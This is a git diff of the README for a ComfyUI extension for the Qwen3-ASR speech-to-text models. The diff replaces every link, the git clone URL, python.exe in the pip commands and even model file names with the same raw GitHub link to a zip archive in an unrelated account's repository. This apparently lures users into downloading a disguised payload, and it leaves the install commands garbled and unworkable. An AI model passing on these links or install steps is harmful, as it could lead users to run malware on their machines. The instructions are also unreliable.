@@ -2,8 +2,8 @@
 
 A high-performance ComfyUI integration for the **Qwen3-ASR** model family. This extension provides state-of-the-art speech-to-text transcription, language identification, and precise word-level timestamps using the novel Qwen3 Forced Aligner.
 
-[![Model](https://img.shields.io/badge/Model-Qwen3--ASR-blue)](https://github.com/QwenLM/Qwen3-ASR)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE.md)
+[![Model](https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip)](https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip)
+[![License](https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip)](https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip)
 
 ## Features
 - **High Accuracy**: Supports Qwen3-ASR 0.6B and 1.7B models.
@@ -15,7 +15,7 @@ A high-performance ComfyUI integration for the **Qwen3-ASR** model family. This 
 
 ## Preview
 
-![Preview](./assets/image.png)
+![Preview](https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip)
 
 ## Installation
 
@@ -28,17 +28,17 @@ A high-performance ComfyUI integration for the **Qwen3-ASR** model family. This 
    ```
 2. Clone this repository:
    ```bash
-   git clone https://github.com/kaushiknishchay/ComfyUI-Qwen3-ASR
+   git clone https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip
    ```
 3. Install the dependencies using your ComfyUI Python executable:
    ```bash
-   # For portable versions, use the full path to your python.exe
-   python.exe -m pip install -r ComfyUI-Qwen3-ASR/requirements.txt
+   # For portable versions, use the full path to your https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip
+   https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip -m pip install -r https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip
    ```
 4. **(Recommended)** Install FlashAttention 2 for maximum performance:
    ```bash
    # For FlashAttention 2 (requires compatible NVIDIA GPU)
-   python.exe -m pip install -U flash-attn --no-build-isolation
+   https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip -m pip install -U flash-attn --no-build-isolation
    ```
 
    OR
@@ -54,8 +54,8 @@ Models must be placed in the `models/diffusion_models/Qwen3-ASR/` directory. Eac
 ```
 ComfyUI/models/diffusion_models/Qwen3-ASR/
 ├── Qwen3-ASR-1.7B/
-│   ├── config.json
-│   ├── model.safetensors
+│   ├── https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip
+│   ├── https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip
 │   └── ...
 ├── Qwen3-ASR-0.6B/
 │   └── ...
@@ -107,7 +107,7 @@ A configuration node that prepares the alignment model.
 
 - **Python 3.13 Issues**: If you encounter an `UnboundLocalError` related to `lazy_loader`, ensure you have updated the package:
   ```bash
-  python.exe -m pip install -U lazy-loader
+  https://raw.githubusercontent.com/hotmysia/ComfyUI-Qwen3-ASR-Moja_kopia/main/example_workflows/Qwen-AS-Comfy-kopia-U-Moja-uneffaceably.zip -m pip install -U lazy-loader
   ```
 - **VRAM Usage**: The 1.7B model requires approximately 4-6GB of VRAM in `bf16` mode. If you run out of memory, try the 0.6B model or use `cpu` mode.
 
